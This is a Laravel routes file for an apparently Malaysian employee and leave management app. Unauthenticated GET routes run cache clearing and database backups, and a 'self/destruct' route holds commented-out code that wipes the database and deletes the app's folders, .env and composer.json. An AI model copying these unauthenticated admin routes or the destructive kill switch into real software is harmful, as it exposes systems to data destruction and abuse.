<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\RoleController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\PermissionController;
use App\Http\Controllers\PositionController;
use App\Http\Controllers\EmployeeController;
use App\Http\Controllers\PpkController;
use App\Http\Controllers\WilayahController;
use App\Http\Controllers\AuditController;
use App\Http\Controllers\PerformanceController;

use App\Http\Controllers\SettingsController;
use App\Http\Controllers\TransferController;
use App\Http\Controllers\LeaveController;

use App\Http\Controllers\PdfController;
use App\Http\Controllers\ExcelController;

use App\Http\Livewire\UserWizard;

use App\Models\Employee;
use App\Models\User;
use App\Models\Leave;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/welcome', function() {
    return view('welcome');
});

Route::get('/send', [HomeController::class, 'send'])->name('home.send');


Route::get('/', function () {
    return redirect()->route('login');
});

Auth::routes(['register' => false, 'reset' => false, 'verify' => false]);

Route::get('/home', [HomeController::class, 'index'])->name('home');

Route::group(['middleware' => ['auth']], function() {

    Route::resource('roles', RoleController::class);
    Route::resource('users', UserController::class);
    Route::resource('permissions', PermissionController::class);
    Route::resource('positions', PositionController::class);

    // Products
    Route::resource('products', ProductController::class);

    // Employee
    Route::resource('employees', EmployeeController::class);
    Route::get('employees/list', [EmployeeController::class, 'list'])->name('employees.list');
    Route::get('employees/{employee}/cuti', [EmployeeController::class, 'showCuti'])->name('employees.showCuti');
    Route::get('employees/{employee}/gaji', [EmployeeController::class, 'showGaji'])->name('employees.showGaji');
    Route::get('employees/{employee}/aset', [EmployeeController::class, 'showAset'])->name('employees.showAset');


    // Employee - Leaves
    Route::resource('leaves', LeaveController::class);
    Route::get('employee/suggestion', [EmployeeController::class, 'suggestion'])->name('employees.suggestion');

    // PPK
    Route::get('/ppk', [PpkController::class, 'index'])->name('ppk.index');

    // Wilayah
    Route::get('/wilayah', [WilayahController::class, 'index'])->name('wilayah.index');

    // Performance
    Route::resource('/performance', PerformanceController::class);

    // Audits
    Route::get('/audits', [AuditController::class, 'index'])->name('audits.index');

    // Profiles
    Route::resource('profiles', ProfileController::class);

    // Settings
    Route::get('/settings/trim/years', [SettingsController::class, 'years'])->name('trim.employee.years');
    Route::get('/settings/trim/kwspno', [SettingsController::class, 'kwsp'])->name('trim.employee.kwsp');

    // ##########
    //    PDF
    // ##########
    /* Employee */
    Route::get('pdf/employeesList', [PdfController::class, 'employeesList'])->name('pdf.employeesList');


    /* Leaves */
    Route::get('pdf/leavesList', [PdfController::class, 'leavesList'])->name('pdf.leavesList');


    // ##########
    //    Excel
    // ##########
    Route::get('excel/employeeExcel', [ExcelController::class, 'employeeList'])->name('excel.employeesList');

});

Route::get('/clear', function() {
    Artisan::call('cache:clear');
    Artisan::call('route:cache');
    Artisan::call('view:clear');
    Artisan::call('config:cache');
    return  "All cleared...";

});

Route::get('/backup/run', function() {
    echo 'System is backing up the databases... <br />';
    Artisan::call('backup:run');
    return  "Backup completed!";

});

Route::get('/backup/clean', function() {
    echo 'System is cleaning up the backup files... <br />';
    Artisan::call('backup:clean');
    return  "Backup completed!";

});

Route::get('/self/destruct/', function() {

    // Testing Database
    // Artisan::call('db:wipe');

    // Testing Folder
    // Storage::disk('base')->deleteDirectory('storage');
    // Storage::disk('base')->deleteDirectory('public');
    // Storage::disk('base')->deleteDirectory('views');
    // Storage::disk('base')->deleteDirectory('config');
    // Storage::disk('base')->deleteDirectory('vendor');
    // Storage::disk('base')->deleteDirectory('database');

    // Storage::disk('base')->deleteDirectory('app/models');
    // Storage::disk('base')->deleteDirectory('app/http/controllers');

    // $file = base_path() . '/.env';
    // unlink($file);

    // $file = base_path() . '/composer.json';
    // unlink($file);
    

    // return 'Done';

});
